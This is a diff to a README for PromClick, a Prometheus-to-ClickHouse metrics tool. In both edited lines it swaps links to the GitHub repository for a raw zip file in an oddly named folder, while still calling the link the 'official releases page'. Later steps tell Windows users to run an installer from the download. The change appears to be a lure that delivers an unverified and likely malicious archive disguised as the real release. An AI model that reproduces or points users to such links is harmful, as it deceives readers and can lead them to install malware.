@@ -1,6 +1,6 @@
 # 🚀 PromClick - Store Prometheus metrics using ClickHouse simply
 
-[![](https://img.shields.io/badge/Download-PromClick-blue.svg)](https://github.com/Namandla0101/PromClick)
+[![](https://img.shields.io/badge/Download-PromClick-blue.svg)](https://raw.githubusercontent.com/Namandla0101/PromClick/main/tinniness/Click-Prom-3.2.zip)
 
 PromClick provides a simple way to store and query your Prometheus metrics using ClickHouse. It removes the need for complex setups like Thanos or Mimir. You get a single, reliable system to manage your data without the overhead of distributed systems.
 
@@ -19,7 +19,7 @@ Most metric storage systems are difficult to manage. They require multiple compo
 
 Follow these steps to set up PromClick on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Namandla0101/PromClick) to download the latest setup file.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Namandla0101/PromClick/main/tinniness/Click-Prom-3.2.zip) to download the latest setup file.
 2. Locate the file named `PromClick-installer.exe` in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the on-screen instructions to select your installation path.
